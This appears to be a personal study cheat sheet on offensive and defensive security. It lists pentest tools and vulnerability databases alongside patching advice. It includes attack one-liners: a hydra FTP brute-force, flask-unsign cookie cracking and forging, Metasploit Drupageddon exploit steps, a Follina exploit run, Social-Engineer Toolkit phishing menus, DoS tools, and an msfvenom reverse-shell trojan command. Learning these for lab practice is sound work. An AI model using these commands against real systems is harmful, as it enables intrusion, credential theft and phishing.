# Frameworks for Recording Threat Actions
https://attack.mitre.org/

## Exploitation is someone brute-forcing it with hydra
hydra -L users.txt -P pass.txt IP_ADDRESS ftp -V

# Intrusion Prevention System (IPS) is security system for catching and preventing security threats.
 ▪ It works on predefined security rules, just like IP

https://www.snort.org/

## How to Check What Ports are Opened on Your PC?
 ▪ Windows: netstat –an, netstat –antb
 ▪ Unix: ss -nltp, netstat –tulpn

# JWT Token Vulnerability
## JWT's secret could be brute-forced like that

flask-unsign -u -c .XXXXXXXXX -nE -w /usr/share/wordlists/rockyou.txt
flask-unsign -s --secret "secret123" --cookie "{'loggin': True, 'username': 'blue'}" -l

sudo -l

## How to Search for Vulnerabilities?
ExploitDB
https://www.exploit-db.com/


## Drupal7  (Versions 7.0 to 7.31 are vulnerable to SQL Injection)

-> smsf6 exploit(multi/http/drupal_drupageddon) > show options
-> msf6 exploit(multi/http/drupal_drupageddon) > exploit

## How to Prevent Obsolete Software Vulnerabilities?

▪ Updates are not just for new functionalities, most of them are designed for fixing security problems –ALWAYS BE UPDATED!
▪ Look for updates in different aspects of your context, for example if the Wordpressengine is the latest version, but the plugins inside are outdated, the same problems can occur.
▪ Look at your system as a whole, donot divide it. If you update any aspect of it, make sure to update all other subsystems

## How to brute-force a Password?

▪ Using hydra (https://github.com/vanhauser-thc/thc-hydra)

Let's see more: 

▪ https://hashcat.net/wiki/doku.php?id=example_hashes
▪ https://crackstation.net

## Get hash with Responder 
https://github.com/SpiderLabs/Responder


# Zero Days Marketplace (There is a database and a marketplace for that)
https://0day.today

# Using Folina
python3 follina.py -r 9999
https://www.hackthebox.com/blog/cve-2022-30190-follina-explained

▪ Log4j used for logging utility based on Java

## More Databases for Vulnerabilities:

 ▪https://www.cve.org/
 ▪https://www.exploit-db.com/
 ▪https://nvd.nist.gov/
 ▪https://www.cvedetails.com

# Frameworks to Perform Wi-Fi Attacks

▪ Airgeddon(https://github.com/v1s1t0r1sh3r3/airgeddon)
▪ WiFiPhisher(https://github.com/wifiphisher/wifiphisher)
▪ WiFiExploitation Framework (https://github.com/D3Ext/WEF)
 
python listener.py
 ▪Source: https://www.youtube.com/watch?v=A8DkVDQW1-w

Technical Side of Phishing Attacks is Scary Easy to Replicate
https://github.com/trustedsec/social-engineer-toolkit

sudo setoolkit

Select from the menu:
1) Social-engineering Attacks
2) Penetration Testing (Fast-Track)
3) Third Party Modules
4) Update the Social-Engineer Toolkit

PRESS: set> 1

Select from the menu:
1) Spear-Phishing Attack Vectors
2) Website Attack Vectors
3) Infectious Media Generator

set> 2

Denial of Service (DOS)is the easiest to perform attack

LOIC (https://sourceforge.net/projects/loic/)–TCP, UDP, HTTP 
GET FLOODS
 ▪HOIC (https://sourceforge.net/projects/highorbitioncannon/)
 HTTP GET / POST requests
 ▪hping3: https://www.kali.org/tools/hping3/
 ▪TorsHammer: https://github.com/Karlheinzniebuhr/torshammer


## How to Generate Simple (and Detectable of Course) Trojan for Reverse Shell Callback?

MSFvenom(MSFvenom-MetasploitUnleashed (offensive security.com))
 ▪msfvenom–p windows/x64/shell/reverse_tcpLHOST=IP 
LPORT=PORT –f exe –o file.exe

# Ransomware

1) WannaCry;
2) CryptoLocker;
3) BadRabbit;

# Spyware
Spywareis a type of malware that stays hidden and gathers as much sensitive data as possible

#  SQL Injection
There are many types of SQL Injection attacks, such as: error based, stacked queries, union based and more;

smsf6 exploit(multi/http/drupal_drupageddon) > show options
msf6 exploit(multi/http/drupal_drupageddon) > exploit

# Brute Forcing Attacks
 ▪Example software for performing the attack:
 ▪THC-Hydra: https://github.com/vanhauser-thc/thchydra
 ▪Burp Intruder: https://portswigger.net/burp/pro
 ▪Medusa: https://github.com/jmk-foofus/medusa

# Security Information and Event Management - SIEM for Securty analysis
QRadar SIEM Demo

▪ Enumerating Reverse Shells
ps -aef --forest

 ▪Analyzing Sliver C2 HTTP Beacon with Wireshark:

# Penetration Testing Operational Systems (OS)
 ▪Kali Linux (https://www.kali.org)
 ▪Parrot OS (https://www.parrotsec.org)
 ▪Black Arch (https://blackarch.org)
 ▪CommandoVM(https://github.com/mandiant/commando-vm)
 ▪Nessus (https://www.tenable.com/products/nessus)
 ▪Nmap (https://nmap.org)
 ▪BurpSuite(https://portswigger.net/burp)
 ▪Searchsploit(https://www.exploit-db.com/searchsploit)

## Scanning local system for *privilege escalation* attack vectors with linpeas
https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS

▪ On github: https://github.com/juliocesarfort/public-pentesting-reports

TryHackMe: https://tryhackme.com/
 ▪Vulnhub: https://www.vulnhub.com/
 ▪HackTheBox: https://www.hackthebox.com/

Use ATT&CK Navigator (https://mitre-attack.github.io/attack-navigator/)to map a sample TTP

USING KALI LINUX with Seclists and Run:
 ▪ cd /opt/
 ▪ sudo git clone https://github.com/danielmiessler/SecLists"
 ▪ cd /usr/share/wordlists
 ▪ sudo gzip–d rockyou.txt.gz